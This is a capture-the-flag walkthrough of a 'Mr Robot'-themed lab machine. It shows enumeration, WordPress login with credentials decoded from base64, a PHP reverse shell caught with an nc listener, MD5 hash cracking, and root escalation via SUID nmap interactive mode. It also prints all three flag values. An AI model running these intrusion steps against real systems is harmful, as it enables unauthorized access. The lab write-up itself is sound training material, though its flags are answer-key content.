# Warning: this writeup contains spoilers


+ **Did an nmap scan on the ip for services and open ports**

    `` nmap -sV -sT -sC  http://10.10.71.91 ``
    
+ **Found an http and https server**
    ```
    Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-02 14:10 EET
    Nmap scan report for 10.10.71.91
    Host is up (0.078s latency).
    Not shown: 997 filtered ports
    PORT    STATE  SERVICE  VERSION
    22/tcp  closed ssh
    80/tcp  open   http     Apache httpd
    |_http-server-header: Apache
    |_http-title: Site doesn't have a title (text/html).
    443/tcp open   ssl/http Apache httpd
    |_http-server-header: Apache
    |_http-title: Site doesn't have a title (text/html).
    | ssl-cert: Subject: commonName=www.example.com
    | Not valid before: 2015-09-16T10:45:03
    |_Not valid after:  2025-09-13T10:45:03

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 46.25 seconds

    ```

+ **Let's dirsearch the website**
  
    `` ./dirsearch.py -u http://10.10.71.91/ -e html,php,js``

+ **Checked robots.txt and found something interesting ...**
    ``` 
    User-agent: *
    fsocity.dic
    key-1-of-3.txt
    ```

+ **Let's check those files**
  
    ``http://10.10.71.91/key-1-of-3.txt``
    ```
    073403c8a58a1f80d943455fb30724b9
    ```
    **bingo**

    The other file seems to be some kind of long password list.

+ **After trying more directories that we've found with no succes,we got to license.txt and found this**

    ```
    what you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
    ```
    It's the first thing we see,but if we scroll down a little...

    ```
    do you want a password or something?
    ZWxsaW90OkVSMjgtMDY1Mgo=
    ```
    seems like we got something,it's obviously base64,so let's decode it

    ```bash 
    notarch@notarch-pc: ~/dirsearch$ echo "ZWxsaW90OkVSMjgtMDY1Mgo=" | base64 -d
    elliot:ER28-0652
    ```

    Looks like we got a username and password

+ **On our dirsearch,something stands out**
    
    ``[14:24:10] 200 -    3KB - /wp-login/``

    we check the page,and we log in with out username and password
    
+ **After some tiring research,I found out the editor in the wordpress site for the webpages and we changed the 404.php to a reverse-php-shell.php and uploaded it**
    
    Then we simply listen to the port we selected:

    ``nc -lvnp 1234``

    and **BOOM**,we got a shell

    ```bash
    notarch@notarch-pc: ~/Downloads$ nc -lvnp 1234
    Connection from 10.10.78.203:52337
    Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
    14:33:24 up 7 min,  0 users,  load average: 0.16, 1.33, 0.90
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1(daemon) gid=1(daemon) groups=1(daemon)
    /bin/sh: 0: can't access tty; jo bcontrol turned off
    $ 

    ```
  We navigate to ``/home/robot`` and we see 2 files that seem interesting:

    ```
    $ ls -la
    total 16
    drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
    drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
    -r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
    -rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5

    ```

    and we got this: ``cat: key-2-of-3.txt: Permission denied``
    
    and this

    ```
    $ cat password.raw-md5
    robot:c3fcd3d76192e4007dfb496cca67e13b
    ```

    We crack the hash on [crack station.](https://crackstation.net/)
    and we get this <span style="background-color: #1e2227">abcdefghijklmnopqrstuvwxyz</span>

    Unfortunately we don't have a TTY,so we spawn one:``    python -c 'import pty; pty.spawn("/bin/bash")'``

    We change the user
    ```bash
    daemon@linux:/home/robot$ su robot
    su robot
    Password: abcdefghijklmnopqrstuvwxyz

    robot@linux:~$ cat key-2-of-3.txt
    822c73956184f694993bede3eb39f959
    ```


+ **As experience dictates,we list all the files that have the SUID bit set:**

  ``find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls {} \; 2>/dev/null``

  We find something interesting

  ```
    /usr/bin/dotlockfile
    /usr/bin/sudo
    /usr/bin/ssh-agent
    /usr/bin/wall
    /usr/local/bin/nmap
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
  ```

  nmap shouldn't be here ...

  ```
    $ ls -l /usr/local/bin/nmap
    -rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
  ```

  After some digging around on how to exploit this,I got to nmap's interactive mode:
  ```
    /usr/local/bin/nmap --interactive
  ```

  ...which leads to a privilege escalation

  ```
    nmap> !sh
    !sh
    # whoami
    whoami
    root
  ```

  **BINGO**

  ```
    # cd /root
    cd /root
    # ls
    ls
    firstboot_done  key-3-of-3.txt
    # cat key-3-of-3.txt
    cat key-3-of-3.txt
    04787ddef27c3dee1ee161b21670b4e4
  ```